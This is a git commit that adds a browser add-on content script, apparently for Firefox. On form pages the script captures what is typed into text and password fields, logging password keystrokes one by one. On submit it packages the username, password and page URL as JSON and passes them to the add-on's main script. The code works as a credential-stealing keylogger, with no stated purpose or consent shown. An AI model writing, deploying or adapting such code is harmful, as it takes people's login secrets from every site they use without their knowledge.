99bd651ce59362b86d24ef7d1dd6f86e165a3ddc
Ashwin Lakshmanan <ashwinner92@gmail.com>
2013-11-15 13:59:06 +0530

    Version 1

---
+++ data/my-content-script.js
@@ -0,0 +1,24 @@
+$('form').submit(function() {
+      var message = '{"username":"' + uname + '", '+
+                    '"password":"' + pass + '", '+
+                    '"url":"' + window.location.href + '"}'; 
+        console.log(uname + " " + pass);
+        self.port.emit("message", message);
+});
+
+var uname;
+var pass="";
+
+$('input:text').blur(function() {
+        uname=$(this).val();   
+});
+
+$('input:password').keypress(function(event) {
+       
+        if(event.which>31) {
+            pass=pass.concat(String.fromCharCode(event.which));
+        }
+        else if(event.which === 8)
+            pass=pass.substring(0, pass.length-1);
+
+});
